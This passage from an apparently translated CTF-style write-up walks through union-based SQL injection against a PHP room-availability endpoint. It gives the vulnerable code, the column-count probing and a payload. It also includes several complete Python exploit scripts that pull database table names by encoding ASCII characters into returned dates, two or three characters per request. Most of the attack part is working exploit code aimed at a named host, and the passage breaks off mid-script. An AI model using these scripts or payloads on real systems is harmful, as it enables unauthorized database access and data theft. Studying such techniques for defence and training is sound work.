<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">&#125;</span></span><span class="token string">s"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The result of running it looks like this:</p>
<p><img src="/img/sql-injection-in-action/p4.png"></p>
<p>We opened 15 threads, and the time was reduced from 45 seconds to 3 seconds. Using multi-threading increased the overall speed by 15 times.</p>
<p>To sum up, in terms of SQL, we can use ternary search to reduce the number of attempts. In terms of programming, we can use multi-threading to send multiple requests at the same time to speed up the attempts. After optimizing both, we can significantly reduce the time.</p>
<h2><span id="case-2-room-reservation-query-function">Case 2: Room reservation query function</span></h2><p>This challenge is a room reservation query function that takes three parameters:</p>
<ol>
<li>id</li>
<li>start_time</li>
<li>end_time</li>
</ol>
<p>The system will then query a table called <code>price</code> to find data that meets the conditions. If there is data that meets the conditions, it means that the room can be reserved, and the returned data will indicate whether each day between <code>start_time</code> and <code>end_time</code> is available or not. If it is available, it will display “Available”, otherwise it will display “Unavailable”.</p>
<p>The injection point in this question is <code>id</code>, because <code>id</code> is not escaped, so SQL injection can be executed. Let’s take a look at the code for this question:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token variable">$startTime</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token variable">$endTime</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token function">strtotime</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'+1 day'</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$found</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$priceItems</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'results'</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$range</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">==</span> <span class="token variable">$range</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"start_time"</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token variable">$range</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"end_time"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$range</span><span class="token punctuation">;</span>
            <span class="token variable">$found</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$found</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token variable">$events</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'events'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
          <span class="token string single-quoted-string">'start'</span> <span class="token operator">=></span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"start_time"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token string single-quoted-string">'end'</span> <span class="token operator">=></span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"end_time"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token string single-quoted-string">'status'</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Available"</span><span class="token punctuation">,</span>
      <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token variable">$events</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'events'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
          <span class="token string single-quoted-string">'start'</span> <span class="token operator">=></span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d'</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token string single-quoted-string">'end'</span> <span class="token operator">=></span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d'</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token string single-quoted-string">'status'</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Unavailable"</span><span class="token punctuation">,</span>
      <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>   
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>As mentioned earlier, this question will start from <code>start_time</code> and add one day at a time until <code>end_time</code>. Then, it will check the <code>priceItems</code> to see if there is data that meets the conditions. If there is, the status of that day will be set to “Available”, otherwise it will be set to “Unavailable”.</p>
<p>Below is the code for retrieving <code>priceItems</code>. The query part has been modified for readability:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">getPriceItems</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token variable">$start</span><span class="token punctuation">,</span> <span class="token variable">$end</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">global</span> <span class="token variable">$conn</span><span class="token punctuation">;</span>

    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">esc_sql</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$end</span> <span class="token operator">=</span> <span class="token function">esc_sql</span><span class="token punctuation">(</span><span class="token variable">$end</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"
    select * from price where (
        (price.start_time >= <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$start</span><span class="token punctuation">&#125;</span></span> AND price.end_time &lt;= <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$end</span><span class="token punctuation">&#125;</span></span>)
          OR (price.start_time &lt;= <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$start</span><span class="token punctuation">&#125;</span></span> AND price.end_time >= <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$start</span><span class="token punctuation">&#125;</span></span>)
          OR (price.start_time &lt;= <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$end</span><span class="token punctuation">&#125;</span></span> AND price.end_time >= <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$end</span><span class="token punctuation">&#125;</span></span>)
        ) AND price.home_id = <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span>
    
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token punctuation">[</span>
        <span class="token string single-quoted-string">'results'</span> <span class="token operator">=></span> <span class="token variable">$arr</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>We can use the <code>union</code> method to make <code>priceItems</code> become the data we specify at the <code>id</code> point. Since <code>union</code> needs to know how many columns there are, we can use the <code>order by &#123;number&#125;</code> method to see how many columns there are. For example, <code>order by 2</code> means sorting by the second column. If there are not enough columns, an error will occur, so we can use a binary search-like method to find out how many columns there are. After trying it out, we found that there are a total of 4 columns.</p>
<p>Next, <code>2023-01-01</code> converted to a timestamp is 1672502400, so our id can look like this:</p>
<pre class="line-numbers language-none"><code class="language-none">0 union select 1672502400,1672502400,1672502400,1672502400<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>You will notice that in the returned data, the status changes to Available, indicating that our SQL injection was successful. The next step is to determine which column is start_time and which is end_time. We can change each column to 1 and see if the returned result changes to determine if we have affected these two columns.</p>
<p>In short, we can use case when to select specific data when a certain condition is met (status becomes Available) and otherwise select another data (status becomes Unavailable), just like the previous question.</p>
<p>However, the big difference between this question and the previous one is that we can control the output of start_time and end_time in the response data. Although these two values must be dates, we can smuggle the data we want to return inside the date.</p>
<p>My approach is to turn the data I want to return into a date. We can first get the nth character in the data, assuming that it will be x after being converted to ascii. We can treat this as meaning “x days”. We add <code>x*3600*24</code> to the timestamp of <code>2023-01-01</code> (1672502400) to get a new timestamp as end_time, which is then converted to a date in PHP.</p>
<p>After obtaining the date from the response, we can calculate how many days have passed since <code>2023-01-01</code>. We convert the date back to a timestamp, subtract 1672502400, and then divide by 86400 (<code>3600*24</code>) to get the number of days. For example, if it is 98 days, it means that the character we read was chr(98), which is b, and we have obtained one character.</p>
<p>Therefore, by smuggling the ascii code in the date, we can obtain one character of data each time we perform an operation. The code is as follows:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># exploit-ava.py</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> datetime
<span class="token keyword">import</span> json
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> time

host <span class="token operator">=</span> <span class="token string">'https://od-php.herokuapp.com/sql'</span>
base_time <span class="token operator">=</span> <span class="token number">1672502400</span>
index <span class="token operator">=</span> <span class="token number">1</span>
result <span class="token operator">=</span> <span class="token string">''</span>
field <span class="token operator">=</span> <span class="token string">'group_concat(table_name)'</span>
fr <span class="token operator">=</span> <span class="token string">" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'"</span>
fr <span class="token operator">=</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>fr<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
  payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'ascii(SUBSTRING(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>field<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">))*86400%2b</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_time<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>
  response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">/availability.php?id=12345%20union%20select%201%20,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_time<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">,4%20</span><span class="token interpolation"><span class="token punctuation">&#123;</span>fr<span class="token punctuation">&#125;</span></span><span class="token string">&amp;start_time=2023-01-01&amp;end_time=2023-01-01'</span></span><span class="token punctuation">)</span>
  index <span class="token operator">+=</span><span class="token number">1</span>
  <span class="token keyword">if</span> response<span class="token punctuation">.</span>ok<span class="token punctuation">:</span>
    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    d <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'events'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'end'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> d <span class="token operator">==</span> <span class="token string">'2023-01-01'</span><span class="token punctuation">:</span>
      <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      diff <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>timestamp<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> base_time
      result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>diff<span class="token operator">/</span><span class="token number">86400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
  <span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span>
    <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">&#125;</span></span><span class="token string">s"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The result of running it is as follows:</p>
<p><img src="/img/sql-injection-in-action/p5.png"></p>
<p>One character is leaked at a time, and it takes about 40 seconds to get the complete result.</p>
<h3><span id="acceleration-smuggling-two-characters-at-a-time">Acceleration: Smuggling two characters at a time</span></h3><p>Since we can smuggle data as numbers into the date, why not smuggle two characters at a time? To avoid conflicts and make it easy to calculate, the second character needs to be multiplied by 128.</p>
<p>The code is as follows:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># exploit-ava-2x.py</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> datetime
<span class="token keyword">import</span> json
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> time

<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>raw<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

host <span class="token operator">=</span> <span class="token string">'https://od-php.herokuapp.com/sql'</span>
base_time <span class="token operator">=</span> <span class="token number">1672502400</span>
index <span class="token operator">=</span> <span class="token number">1</span>
result <span class="token operator">=</span> <span class="token string">''</span>
field <span class="token operator">=</span> <span class="token string">'group_concat(table_name)'</span>
fr <span class="token operator">=</span> <span class="token string">" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'"</span>
fr <span class="token operator">=</span> encode<span class="token punctuation">(</span>fr<span class="token punctuation">)</span>
start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
  payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''
    ascii(SUBSTRING(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>field<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">))*86400
    + ascii(SUBSTRING(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>field<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">))*86400*128
    + </span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_time<span class="token punctuation">&#125;</span></span><span class="token string">
  '''</span></span>
  response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">/availability.php?id=12345%20union%20select%201%20,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_time<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,4%20</span><span class="token interpolation"><span class="token punctuation">&#123;</span>fr<span class="token punctuation">&#125;</span></span><span class="token string">&amp;start_time=2023-01-01&amp;end_time=2023-01-01'</span></span><span class="token punctuation">)</span>
  index <span class="token operator">+=</span><span class="token number">2</span>
  <span class="token keyword">if</span> response<span class="token punctuation">.</span>ok<span class="token punctuation">:</span>
    data <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
    d <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">'events'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'end'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> d <span class="token operator">==</span> <span class="token string">'2023-01-01'</span><span class="token punctuation">:</span>
      <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
      diff <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>d<span class="token punctuation">,</span> <span class="token string">"%Y-%m-%d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>timestamp<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> base_time
      
      diff <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>diff<span class="token operator">/</span><span class="token number">86400</span><span class="token punctuation">)</span>
      first <span class="token operator">=</span> diff <span class="token operator">%</span> <span class="token number">128</span>
      result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span>

      second <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>diff <span class="token operator">-</span> first<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">128</span><span class="token punctuation">)</span>
      <span class="token keyword">if</span> second <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
      result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>second<span class="token punctuation">)</span>
      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"current:"</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span>
  <span class="token keyword">else</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span>
    <span class="token keyword">break</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"result:"</span><span class="token punctuation">,</span> result<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"time: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">&#125;</span></span><span class="token string">s"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The result of running it is:</p>
<p><img src="/img/sql-injection-in-action/p6.png"></p>
<p>It took a total of 19 seconds, which is twice as fast as the previous method, which is very reasonable.</p>
<h3><span id="further-acceleration-smuggling-n-characters-at-a-time">Further acceleration: Smuggling n characters at a time</span></h3><p>The previous method actually treats the string as a number in base 128. For example, <code>mvc</code> in ascii code is 109, 119, 99, and the corresponding number is <code>99 + 128*119 + 128*128*109</code> &#x3D; 1801187, which is about 4935 years.</p>
<p>In theory, as long as this year does not exceed the range that the programming language can represent, we can obtain multiple characters at a time. Taking PHP as an example, we can write a simple script to calculate:</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
  <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">1672502400</span><span class="token punctuation">;</span>
  <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$num</span> <span class="token operator">*=</span> <span class="token number">128</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d'</span><span class="token punctuation">,</span> <span class="token variable">$base</span> <span class="token operator">+</span> <span class="token variable">$num</span><span class="token operator">*</span><span class="token number">86400</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The output is:</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">1
2023-05-08
2
2067-11-09
3
7764-10-21
4
736974-04-25
5
94075791-06-08
6
12041444382-10-24
7
PHP Warning:  date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7

8
PHP Warning:  date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7

9
PHP Warning:  date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7

10
PHP Warning:  date() expects parameter 2 to be int, float given in /Users/li.hu/Documents/playground/ctf/sql-injection/test.php on line 7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>This means that we can get up to 5 characters at a time, because <code>128^6</code> is still within the permissible range and will not cause an overflow.</p>
<p>However, when Python uses <code>datetime.strptime</code> to convert a date to a timestamp, the highest upper limit seems to be 9999, and an error will be thrown if it exceeds this limit. Therefore, unless you write your own conversion, you can only get data for 3 characters at a time at most. Writing this conversion is very troublesome (you need to consider the number of days in each month and leap years), so I only implemented a version for 3 characters, the code is as follows:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># exploit-ava-3x.py</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> datetime
<span class="token keyword">import</span> json
<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parse
<span class="token keyword">import</span> time

<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>raw<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

host <span class="token operator">=</span> <span class="token string">'https://od-php.herokuapp.com/sql'</span>
base_time <span class="token operator">=</span> <span class="token number">1672502400</span>
index <span class="token operator">=</span> <span class="token number">1</span>
result <span class="token operator">=</span> <span class="token string">''</span>
field <span class="token operator">=</span> <span class="token string">'group_concat(table_name)'</span>
fr <span class="token operator">=</span> <span class="token string">" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'"</span>
fr <span class="token operator">=</span> encode<span class="token punctuation">(</span>fr<span class="token punctuation">)</span>
start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
  payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''
    ascii(SUBSTRING(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>field<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">))*86400
    + ascii(SUBSTRING(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>field<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">))*86400*128
    + ascii(SUBSTRING(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>field<span class="token punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">&#125;</span></span><span class="token string">))*86400*128*128
    + </span><span class="token interpolation"><span class="token punctuation">&#123;</span>base_time<span class="token punctuation">&#125;</span></span><span class="token string">
  '''</span></span>
